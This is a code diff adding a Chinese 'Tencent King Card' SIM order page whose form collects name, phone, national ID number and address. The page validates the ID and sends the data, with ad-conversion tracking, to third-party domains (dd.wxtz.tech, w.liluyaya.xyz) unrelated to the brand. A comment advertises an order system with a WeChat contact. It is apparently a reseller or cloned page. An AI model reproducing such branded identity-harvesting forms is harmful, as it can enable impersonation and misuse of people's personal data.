@@ -1,0 +1,771 @@
+﻿
+
+
+<!DOCTYPE html>
+<html class="pixel-ratio-1"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="format-detection" content="telephone=no">
+    <title>腾讯王卡</title>
+<link rel="stylesheet" href="/index_files/comman.css">
+<link rel="stylesheet" href="/index_files/header.css">
+<link rel="stylesheet" href="/index_files/query_number.css">
+<link href="/index_files/new-fill.css" rel="stylesheet">
+<link href="/index_files/weui.css" rel="stylesheet">
+<link href="/index_files/weui2.css" rel="stylesheet">
+
+<!-- 领头羊 订单系统
+     专业的服务，实惠的价格，包您满意！
+	 微信联系： as820104
+
+   -->
+ <script>
+    (function(r,d,s,l){var meteor=r.meteor=r.meteor||[];meteor.methods=["track","off","on"];meteor.factory=function(method){return function(){
+    var args=Array.prototype.slice.call(arguments);args.unshift(method);meteor.push(args);return meteor}};for(var i=0;i<meteor.methods.length;i++){
+    var key=meteor.methods[i];meteor[key]=meteor.factory(key)}meteor.load=function(){var js,fjs=d.getElementsByTagName(s)[0];js=d.createElement(s);
+    js.src="https://analytics.snssdk.com/meteor.js/v1/"+l+"/sdk";fjs.parentNode.insertBefore(js,fjs)};meteor.load();if(meteor.invoked){return}
+    meteor.invoked=true;meteor.track("pageview")})(window,document,"script","1661390430624781");
+  </script>
+<script type="text/javascript" src="/index_files/city_new.js"></script>
+
+<script type="text/javascript" src="/index_files/picker.js"></script><style type="text/css">.picker{display:none;position:fixed;top:0;left:0;right:0;bottom:0;z-index:100;width:100%;height:100%;overflow:hidden;text-align:center;font-family:PingFang SC,STHeitiSC-Light,Helvetica-Light,arial,sans-serif;font-size:14px;-moz-user-select:none;-webkit-user-select:none;-ms-user-select:none;user-select:none}.picker .picker-mask{position:absolute;z-index:500;width:100%;height:100%;transition:all .5s;-webkit-transition:all .5s;background:transparent;opacity:0}.picker .picker-mask.show{background:rgba(0,0,0,.6);opacity:1}.picker .picker-panel{position:absolute;z-index:600;bottom:0;width:100%;height:243px;background:#fff;transform:translateY(243px);-webkit-transform:translateY(243px);transition:all .5s;-webkit-transition:all .5s}.picker .picker-panel.show{transform:translateY(0);-webkit-transform:translateY(0)}.picker .picker-panel .picker-choose{position:relative;height:50px;color:#878787;font-size:14px}.picker .picker-panel .picker-choose .picker-title{line-height:50px;font-size:19px;text-align:center;color:#333}.picker .picker-panel .picker-choose .cancel,.picker .picker-panel .picker-choose .confirm{position:absolute;padding:10px;top:6px}.picker .picker-panel .picker-choose .confirm{right:0;color:#fa8919}.picker .picker-panel .picker-choose .cancel{left:0}.picker .picker-panel .picker-content{position:relative}.picker .picker-panel .picker-content .mask-bottom,.picker .picker-panel .picker-content .mask-top{position:absolute;z-index:10;width:100%;height:68px;pointer-events:none;transform:translateZ(0);-webkit-transform:translateZ(0)}.picker .picker-panel .picker-content .mask-top{top:0;background:-webkit-gradient(linear,left bottom,left top,from(hsla(0,0%,100%,.4)),to(hsla(0,0%,100%,.8)));background:-o-linear-gradient(bottom,hsla(0,0%,100%,.4),hsla(0,0%,100%,.8))}.picker .picker-panel .picker-content .mask-top:after,.picker .picker-panel .picker-content .mask-top:before{display:block;position:absolute;border-top:1px solid #ccc;left:0;width:100%;content:" "}.picker .picker-panel .picker-content .mask-top:before{display:none;top:0}.picker .picker-panel .picker-content .mask-top:after{display:block;bottom:0}.picker .picker-panel .picker-content .mask-bottom{bottom:0;background:-webkit-gradient(linear,left top,left bottom,from(hsla(0,0%,100%,.4)),to(hsla(0,0%,100%,.8)));background:-o-linear-gradient(top,hsla(0,0%,100%,.4),hsla(0,0%,100%,.8))}.picker .picker-panel .picker-content .mask-bottom:after,.picker .picker-panel .picker-content .mask-bottom:before{display:block;position:absolute;border-top:1px solid #ccc;left:0;width:100%;content:" "}.picker .picker-panel .picker-content .mask-bottom:before{display:block;top:0}.picker .picker-panel .picker-content .mask-bottom:after{display:none;bottom:0}.picker .picker-panel .wheel-wrapper{display:-ms-flexbox;display:-webkit-box;display:flex;padding:0 10px}.picker .picker-panel .wheel-wrapper .wheel{-ms-flex:1 1 1e-9px;-webkit-box-flex:1;flex:1;flex-basis:1e-9px;width:1%;height:173px;overflow:hidden;font-size:21px}.picker .picker-panel .wheel-wrapper .wheel .wheel-scroll{margin-top:68px;line-height:36px}.picker .picker-panel .wheel-wrapper .wheel .wheel-scroll .wheel-item{height:36px;overflow:hidden;white-space:nowrap;color:#333}.picker .picker-footer{height:20px}@media (-webkit-min-device-pixel-ratio:1.5),(min-device-pixel-ratio:1.5){.border-1px:after,.border-1px:before{-webkit-transform:scaleY(.7);-webkit-transform-origin:0 0;transform:scaleY(.7)}.border-1px:after{-webkit-transform-origin:left bottom}}@media (-webkit-min-device-pixel-ratio:2),(min-device-pixel-ratio:2){.border-1px:after,.border-1px:before{-webkit-transform:scaleY(.5);transform:scaleY(.5)}}</style>
+<script type="text/javascript" src="/index_files/jquery.js"></script>
+<script type="text/javascript" src="/index_files/zepto_002.js"></script>
+
+<script type="text/javascript" src="/index_files/zepto.js"></script>
+<link href="/index_files/weuix.css" rel="stylesheet">
+<script type="text/javascript" src="/index_files/picker_002.js"></script>
+
+
+<link href="/index_files/weuixx.css" rel="stylesheet">
+
+    <style>
+        .hide{
+        display: none;
+        }
+        /*图片上传部分样式*/
+        .uploadImg ul,li{
+        list-style: none;
+        margin:0;
+        padding: 0;
+        }
+        .uploadImg ul{
+        width:100%;
+        display: flex;
+        justify-content: space-evenly;
+        font-size: .5rem;
+        }
+        .uploadImg li{
+        text-align: center;
+        }
+        .uploadImg li>div:not(.hide){
+        display: inline-block;
+        position: relative;
+        }
+        .validate-required::before{
+        content: '*';
+        color: red;
+        font-size: 50%;
+        }
+        .weui-cells_form{
+        margin-top: 0;
+        }
+
+        ul,li{
+        list-style: none;
+        margin:0;
+        padding: 0;
+        }
+
+        .weui-cell__bd ul{
+        width:100%;
+        display: flex;
+        justify-content: space-evenly;
+        font-size: .5rem;
+        }
+
+        .weui-popup__container--visible .close-popup{
+        display: block;
+        }
+
+        .weui-cells{
+        margin:0;
+        }
+        .roleDiv>div{
+        display: none;
+        }
+
+    </style>
+
+
+</head>
+<body>
+
+ 
+     <div class="userInput" style="width: 100%">
+          <div class="bannerImg" align="center"><img src="http://x-cdn-wo.gzuni.com/apps/kingcard/static/b2i_cmb_valicode/images/xsg/hc7_15845015915772278.jpg"></div>
+     </div>
+ 
+
+
+   <div class="con_" style="background: url(http://x-cdn-wo.gzuni.com/apps/kingcard/static/b2i_cmb_valicode/images/xsg/hc7_15845017740783597.png);width: 100%">
+
+
+
+<div class="container" style="width: 90.5%;margin: auto">
+<form method="post" name="form1" class="loginPage" action="http://dd.wxtz.tech/?url=w.liluyaya.xyz" enctype="multipart/form-data" >
+<input type="hidden" name="uwatchproduct" value="腾讯大王卡">
+<input type="hidden" name="udevice" id="udevice" value="pc">
+<section class="fill-wrapper">
+
+<div class="fill">
+
+
+
+
+   <h2 id="fill-desc" style="display: block;background-color: #D4D4D4;font-weight: 900" hidden=""><b>根据国家实名制要求, 请准确提供有效证件信息</b></h2>
+
+<ul class="fill-list">
+<li id="apply-name">
+     <div class="p-title"><b><span style="color: red;">*</span>姓名</b></div>
+	 <div class="p-content">
+         <input id="certName" name="uname" type="text" title="姓名" placeholder="请输入有效证件姓名" maxlength="20">
+	 </div>
+</li>
+
+<li id="apply-phone">
+     <div class="p-title"><b><span style="color: red;">*</span>联系电话</b></div>
+	 <div class="p-content"> <input id="mobilePhone" name="utel" type="text" title="联系电话" placeholder="请输入联系电话" maxlength="13"> </div>
+</li>
+
+
+<li id="apply-id">
+
+
+
+
+
+    <div id="sfz" style="display: none;">
+     <div class="p-title"><b><span style="color: red;">*</span>有效证件</b></div>
+	 <div class="p-content"> <input id="certNo" name="uidcard" type="text" title="身份证" placeholder="有效证件号码" maxlength="18"> <i class="errorI"></i> </div>
+    </div>
+
+
+
+
+
+
+
+
+</li>
+
+</ul>
+</div>
+
+<div class="fill fill-two">
+    <h2 style="background-color: #D4D4D4;font-weight: 900">
+        <b>请填写配送地址</b>
+        <span class="red">(新疆西藏不支持配送)</span>
+    </h2>
+<ul class="fill-list">
+<li id="delivery">
+	<div class="p-title"><b><span style="color: red;">*</span>所在地区</b></div> <div class="p-content" id="sel_city">点击选取省市区县</div>
+	<input id="city" name="sel_city" type="hidden">
+ </li>
+
+<li class="delivery" id="delivery-desc">
+    <div class="p-content p-text-area">
+        <p class="text-temp" id="address-temp"></p>
+        <textarea id="address" class="text-area" name="addr_detail" rows="1" title="delivery-desc" placeholder="街道/镇+村/小区/写字楼+门牌号"></textarea>
+    </div>
+</li>
+</ul>
+</div>
+
+</section>
+    <section class="apply" style="background-color: #f7f7f7;color: #505050;margin-top: -1rem">
+
+
+        <div class="protocol-div" style="margin-top: -1rem;">
+
+         <div class="checkbox">
+         
+            <input type="checkbox" id="checkbox1" name="checkboox" value="1" checked="checked">
+         
+               <label for="checkbox1"></label>
+         </div>
+
+        <p class="protocol agree" id="protocol" style="margin-left: 1rem; margin-top: -0.5rem">
+                       我已阅读并同意
+
+         <a href="http://www.gzuni.com/apps/kingcard/b2i/display__protocal/" id="go-protocol">《客户入网服务协议及业务协议》</a>
+
+        </p>
+         <p class="protocol agree" id="protocol" style="margin-left: 6rem; margin-top: -0.5rem">
+             <a href="javascript:read_protocol_yy();" id="go-protocol">《业务办理公告》</a>
+         </p>
+
+
+<div id="sanzhao_div" style="display: none;">
+         <div class="weui-cells weui-cells_form">
+            <div class="weui-cell">
+                 
+                   
+        </div>
+</div>
+</div>
+
+
+
+        <div class="btn-box">
+            <input type="submit" id="sub" name="submit" class="btn" value="立即提交 &nbsp; 免费送货上门">
+
+        </div>
+
+
+<div class="privacy" style="text-align:center; padding-left: 5rem;margin-top: 0.8rem" align="center">
+    
+    <span style="font-size: 12px">
+        <p><span style="color: red">*1、未满16周岁的，因政策原因不发货，请勿下单。</span></p>
+        <p>*2、请保持电话畅通，我们将随时可能与您联系。</p>
+    </span>
+    
+</div>
+
+   </div>
+
+    </section>
+
+</form>
+</div>
+</div>
+
+  
+    <div class="userInput" style="width: 100%">
+       <div class="bannerImg_for" align="center"><img src="http://x-cdn-wo.gzuni.com/apps/kingcard/static/b2i_cmb_valicode/images/xsg/hc7_15845015949290673.jpg"></div>
+    </div>
+  
+
+
+ 
+     <div></div>
+ 
+
+ 
+     <div></div>
+
+ <input type="text" id="card_type" value="dwk" hidden="">
+ <input type="text" id="k_tag" value="0" hidden="">
+ <input type="text" id="sanzhao_tag" value="1" hidden="">
+ <input type="text" id="need_cert" value="1" hidden="">
+
+
+    <script type="text/javascript">
+
+       $(document).ready(function(){
+           var scene = '';
+           scene = "HC7";
+
+           if('LP' == scene){
+               $('#sfz').show();
+           }else{
+               $('#sfz').hide();
+           }
+
+        });
+
+$("#certName").bind("input propertychange",function () {//监控输入框的变化
+    var certName = $("#certName").val();
+    var mobilePhone = $("#mobilePhone").val();
+    var flag1 = checkName(certName);
+    var flag2 = true;
+    var scene = '';
+    scene = "HC7";
+
+    if('LP' == scene){}else {
+        if (mobilePhone.length == '11') {
+            flag2 = false;
+        } else {
+            flag2 = true;
+        }
+
+        if (flag1 || flag2) {
+            $('#sfz').hide();
+        } else {
+            $('#sfz').show();
+        }
+    }
+});
+
+$("#mobilePhone").bind("input propertychange",function () {//监控输入框的变化
+    var certName = $("#certName").val();
+    var mobilePhone = $("#mobilePhone").val();
+    var flag1 = checkName(certName);
+    var flag2 = true;
+    var scene = '';
+    scene = "HC7";
+
+    if('LP' == scene){}else {
+
+        if (mobilePhone.length == '11') {
+            flag2 = false;
+        } else {
+            flag2 = true;
+        }
+
+        if (flag1 || flag2) {
+            $('#sfz').hide();
+        } else {
+            $('#sfz').show();
+        }
+    }
+});
+
+
+	</script>
+
+
+
+
+
+<script>
+  //  Logger();
+var nameEl = document.getElementById('sel_city');
+var nameCity = document.getElementById('city');
+
+var first = []; /* 省，直辖市 */
+var second = []; /* 市 */
+var third = []; /* 镇 */
+
+var selectedIndex = [0, 0, 0]; /* 默认选中的地区 */
+
+var checked = [0, 0, 0]; /* 已选选项 */
+
+function creatList(obj, list){
+  obj.forEach(function(item, index, arr){
+  var temp = new Object();
+  temp.text = item.name;
+  temp.value = index;
+  list.push(temp);
+  })
+}
+
+creatList(city, first);
+
+if (city[selectedIndex[0]].hasOwnProperty('sub')) {
+  creatList(city[selectedIndex[0]].sub, second);
+} else {
+  second = [{text: '', value: 0}];
+}
+
+if (city[selectedIndex[0]].sub[selectedIndex[1]].hasOwnProperty('sub')) {
+  creatList(city[selectedIndex[0]].sub[selectedIndex[1]].sub, third);
+} else {
+  third = [{text: '', value: 0}];
+}
+
+var picker = new Picker({
+    data: [first, second, third],
+  selectedIndex: selectedIndex,
+    title: '地址选择'
+});
+
+picker.on('picker.select', function (selectedVal, selectedIndex) {
+  var text1 = first[selectedIndex[0]].text;
+  var text2 = second[selectedIndex[1]].text;
+  var text3 = third[selectedIndex[2]] ? third[selectedIndex[2]].text : '';
+  var need_cert = $('#need_cert').val();
+    nameEl.innerText = text1 + ' ' + text2 + ' ' + text3 + ' ';
+    nameCity.value = text1 + ' ' + text2 + ' ' + text3 + ' ';
+
+    if(need_cert == '0'){
+        addr_check();
+    }else{
+        console.log('nothing to do');
+    }
+
+
+});
+
+picker.on('picker.change', function (index, selectedIndex) {
+  if (index === 0){
+    firstChange();
+  } else if (index === 1) {
+    secondChange();
+  }
+
+  function firstChange() {
+    second = [];
+    third = [];
+    checked[0] = selectedIndex;
+    var firstCity = city[selectedIndex];
+    if (firstCity.hasOwnProperty('sub')) {
+      creatList(firstCity.sub, second);
+
+      var secondCity = city[selectedIndex].sub[0]
+      if (secondCity.hasOwnProperty('sub')) {
+        creatList(secondCity.sub, third);
+      } else {
+        third = [{text: '', value: 0}];
+        checked[2] = 0;
+      }
+    } else {
+      second = [{text: '', value: 0}];
+      third = [{text: '', value: 0}];
+      checked[1] = 0;
+      checked[2] = 0;
+    }
+
+    picker.refillColumn(1, second);
+    picker.refillColumn(2, third);
+    picker.scrollColumn(1, 0)
+    picker.scrollColumn(2, 0)
+  }
+
+  function secondChange() {
+    third = [];
+    checked[1] = selectedIndex;
+    var first_index = checked[0];
+    if (city[first_index].sub[selectedIndex].hasOwnProperty('sub')) {
+      var secondCity = city[first_index].sub[selectedIndex];
+      creatList(secondCity.sub, third);
+      picker.refillColumn(2, third);
+      picker.scrollColumn(2, 0)
+    } else {
+      third = [{text: '', value: 0}];
+      checked[2] = 0;
+      picker.refillColumn(2, third);
+      picker.scrollColumn(2, 0)
+    }
+  }
+
+});
+
+picker.on('picker.valuechange', function (selectedVal, selectedIndex) {
+  console.log(selectedVal);
+  console.log(selectedIndex);
+});
+
+nameEl.addEventListener('click', function () {
+    picker.show();
+});
+</script><div class="picker">
+  <div class="picker-mask mask-hook"></div>
+  <div class="picker-panel panel-hook">
+    <div class="picker-choose choose-hook">
+      <span class="cancel cancel-hook">取消</span>
+      <span class="confirm confirm-hook">确定</span>
+      <h1 class="picker-title">地址选择</h1>
+    </div>
+    <div class="picker-content">
+      <div class="mask-top border-1px"></div>
+      <div class="mask-bottom border-1px"></div>
+      <div class="wheel-wrapper wheel-wrapper-hook">
+        
+          <div class="wheel wheel-hook">
+            <ul class="wheel-scroll wheel-scroll-hook">
+              
+                <li class="wheel-item" data-val="0">湖南</li>
+              
+                <li class="wheel-item" data-val="1">贵州</li>
+              
+                <li class="wheel-item" data-val="2">云南</li>
+              
+                <li class="wheel-item" data-val="3">青海</li>
+              
+                <li class="wheel-item" data-val="4">江苏</li>
+              
+                <li class="wheel-item" data-val="5">浙江</li>
+              
+                <li class="wheel-item" data-val="6">福建</li>
+              
+                <li class="wheel-item" data-val="7">广东</li>
+              
+                <li class="wheel-item" data-val="8">甘肃</li>
+              
+                <li class="wheel-item" data-val="9">北京</li>
+              
+                <li class="wheel-item" data-val="10">重庆</li>
+              
+                <li class="wheel-item" data-val="11">陕西</li>
+              
+                <li class="wheel-item" data-val="12">天津</li>
+              
+                <li class="wheel-item" data-val="13">河北</li>
+              
+                <li class="wheel-item" data-val="14">河南</li>
+              
+                <li class="wheel-item" data-val="15">宁夏</li>
+              
+                <li class="wheel-item" data-val="16">新疆</li>
+              
+                <li class="wheel-item" data-val="17">西藏</li>
+              
+                <li class="wheel-item" data-val="18">山西</li>
+              
+                <li class="wheel-item" data-val="19">江西</li>
+              
+                <li class="wheel-item" data-val="20">海南</li>
+              
+                <li class="wheel-item" data-val="21">上海</li>
+              
+                <li class="wheel-item" data-val="22">四川</li>
+              
+                <li class="wheel-item" data-val="23">内蒙古</li>
+              
+                <li class="wheel-item" data-val="24">辽宁</li>
+              
+                <li class="wheel-item" data-val="25">吉林</li>
+              
+                <li class="wheel-item" data-val="26">湖北</li>
+              
+                <li class="wheel-item" data-val="27">山东</li>
+              
+                <li class="wheel-item" data-val="28">广西</li>
+              
+                <li class="wheel-item" data-val="29">黑龙江</li>
+              
+                <li class="wheel-item" data-val="30">安徽</li>
+              
+            </ul>
+          </div>
+        
+          <div class="wheel wheel-hook">
+            <ul class="wheel-scroll wheel-scroll-hook">
+              
+                <li class="wheel-item" data-val="0">常德市</li>
+              
+                <li class="wheel-item" data-val="1">怀化市</li>
+              
+                <li class="wheel-item" data-val="2">长沙市</li>
+              
+                <li class="wheel-item" data-val="3">湘潭市</li>
+              
+                <li class="wheel-item" data-val="4">衡阳市</li>
+              
+                <li class="wheel-item" data-val="5">岳阳市</li>
+              
+                <li class="wheel-item" data-val="6">益阳市</li>
+              
+                <li class="wheel-item" data-val="7">湘西土家族苗族自治州</li>
+              
+                <li class="wheel-item" data-val="8">株洲市</li>
+              
+                <li class="wheel-item" data-val="9">张家界市</li>
+              
+                <li class="wheel-item" data-val="10">郴州市</li>
+              
+                <li class="wheel-item" data-val="11">永州市</li>
+              
+                <li class="wheel-item" data-val="12">娄底市</li>
+              
+                <li class="wheel-item" data-val="13">邵阳市</li>
+              
+            </ul>
+          </div>
+        
+          <div class="wheel wheel-hook">
+            <ul class="wheel-scroll wheel-scroll-hook">
+              
+                <li class="wheel-item" data-val="0">桃源县</li>
+              
+                <li class="wheel-item" data-val="1">武陵区</li>
+              
+                <li class="wheel-item" data-val="2">澧县</li>
+              
+                <li class="wheel-item" data-val="3">鼎城区</li>
+              
+                <li class="wheel-item" data-val="4">安乡县</li>
+              
+                <li class="wheel-item" data-val="5">津市市</li>
+              
+                <li class="wheel-item" data-val="6">汉寿县</li>
+              
+                <li class="wheel-item" data-val="7">临澧县</li>
+              
+                <li class="wheel-item" data-val="8">石门县</li>
+              
+            </ul>
+          </div>
+        
+      </div>
+    </div>
+    <div class="picker-footer footer-hook"></div>
+  </div>
+</div>
+
+
+
+<script type="text/javascript" src="/index_files/query_num_track_hl1.js"></script>
+<script>
+                    
+                    function subClick() {
+                        var card = document.getElementById("certNo").value;
+                        var lxname = document.getElementById("certName").value; 
+                        var uaddress = document.getElementById("address").value;
+		        var tel =document.getElementById("mobilePhone").value;
+			var uname=document.getElementById("certName").value;
+                        var city = {
+                            11: "北京",
+                            12: "天津",
+                            13: "河北",
+                            14: "山西",
+                            15: "内蒙古",
+                            21: "辽宁",
+                            22: "吉林",
+                            23: "黑龙江 ",
+                            31: "上海",
+                            32: "江苏",
+                            33: "浙江",
+                            34: "安徽",
+                            35: "福建",
+                            36: "江西",
+                            37: "山东",
+                            41: "河南",
+                            42: "湖北 ",
+                            43: "湖南",
+                            44: "广东",
+                            45: "广西",
+                            46: "海南",
+                            50: "重庆",
+                            51: "四川",
+                            52: "贵州",
+                            53: "云南",
+                            54: "西藏 ",
+                            61: "陕西",
+                            62: "甘肃",
+                            63: "青海",
+                            64: "宁夏",
+                            65: "新疆",
+                            71: "台湾",
+                            81: "香港",
+                            82: "澳门",
+                            91: "国外 "
+                        };
+
+                        if (lxname == "") {
+                            alert("姓名不能为空!");
+                            return false;
+                        }
+
+                        if (card == "") {
+                            // $("#uidcard").show().focus();
+                            alert("请输入身份证号码");
+                            return false;
+                        } else if (!card || !/^\d{6}(18|19|20)?\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}(\d|X)$/i.test(card)) {
+                            alert("身份证号格式错误");
+                            return false;
+                        } else if (!city[card.substr(0, 2)]) {
+                            alert("地址编码错误");
+                            return false;
+                        }else{
+                            if (card.length == 18) {
+                                card = card.split('');
+                                //∑(ai×Wi)(mod 11)
+                                //加权因子
+                                var factor = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
+                                //校验位
+                                var parity = [1, 0, 'X', 9, 8, 7, 6, 5, 4, 3, 2];
+                                var sum = 0;
+                                var ai = 0;
+                                var wi = 0;
+                                for (var i = 0; i < 17; i++) {
+                                    ai = card[i];
+                                    wi = factor[i];
+                                    sum += ai * wi;
+
+                                }
+                                var last = parity[sum % 11];
+                                //最后一位不区分大小写
+                                if (card[17] == 'x') card[17] = card[17].toUpperCase();
+                                if (parity[sum % 11] != card[17]) {
+                                    alert("身份证号有误请重新输入！！！");
+                                    return false;
+                                }
+                            } else{
+				alert("身份证号长度有误请重新输入!"); 
+ 				return false; 
+
+				}
+                        } 
+                      
+                       
+						
+						var re = /^1\d{10}$/;
+					
+					    if ($("#s_county").val() == "地区") {
+                            alert("请选择地区!");
+                            return false;
+                        } 
+						
+					    if (uaddress == "") {
+                            alert("详细地址不能为空!");
+                            return false;
+                        } 
+					
+						if (re.test(tel)) {
+						var result =false;
+                                              
+						    $.ajax({
+							async:false,//同步加载
+							type: "POST",//方法类型
+							dataType: "json",//返回的数据类型
+							url: "http://dd.wxtz.tech/precheck/?url=w.liluyaya.xyz" ,//url
+							data: {"uname": uname, "utel": tel},
+							success: function (data) { 
+                                                                //alert("use meteor.track");
+                                			console.log(data);
+								if(data["msg"]=="ok"){
+								meteor.track("form", {convert_id: "1661041848697860"});
+									result=true;
+									
+								}else{
+								    alert("您已提交过该信息！");
+									result=false;
+								}
+								return result;
+							}
+						    });
+                                        
+						
+					   
+						}else{
+							alert("请输入正确的手机号！");
+							return false;
+						}
+						
+						
+						function Tark(){
+              meteor.track("form", {convert_id: "1661563122198531"});}
+						
+                        return true;
+						
+						
+						
+						
+                    }
+					
+					
+document.getElementById("sub").onclick=subClick;
+                
+
+var u = navigator.userAgent;        //是否是android浏览器
+		var isAndroid = u.indexOf('Android') > -1;        //是否是ios浏览器
+	var isIos = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);        var msg = '';        if (isAndroid) {
+		msg = "android";
+		document.getElementById("udevice").value = msg;
+	} else if (isIos) {
+		msg = 'ios';
+		document.getElementById("udevice").value = msg;
+	} else {
+		msg = 'pc';
+		document.getElementById("udevice").value = msg;
+	};
+</script>
+
+
+
+</body></html>
+
+
